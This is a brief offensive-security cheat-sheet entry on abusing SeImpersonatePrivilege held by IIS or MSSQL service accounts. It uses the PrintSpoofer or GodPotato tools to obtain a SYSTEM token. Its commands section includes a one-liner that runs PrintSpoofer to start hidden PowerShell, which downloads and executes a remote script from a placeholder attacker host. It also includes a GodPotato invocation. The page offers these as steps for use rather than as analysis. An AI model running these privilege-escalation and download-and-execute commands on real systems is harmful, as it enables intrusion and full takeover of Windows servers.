# 11.05 Token Privilege Abuse SeImpersonate

> Abuse `SeImpersonatePrivilege` on IIS/MSSQL accounts with `PrintSpoofer` (1809-22H2) or `GodPotato` (Server 2022) to steal a SYSTEM token.

## Overview

Service accounts (IIS, MSSQL) typically hold SeImpersonatePrivilege. Use the right Potato for the Windows version: PrintSpoofer (1809-22H2), GodPotato (Server 2022).

## Steps

- **Check privs** — whoami /priv.
- **Pick a Potato** — try PrintSpoofer first, fall back to GodPotato.
- **Run command as SYSTEM**.

## Commands

### PrintSpoofer

```cmd
whoami /priv | findstr SeImpersonate
PrintSpoofer.exe -i -c "powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://<LHOST>/r.ps1')"
```

### GodPotato (newer)

```cmd
GodPotato.exe -cmd "cmd /c whoami"
```
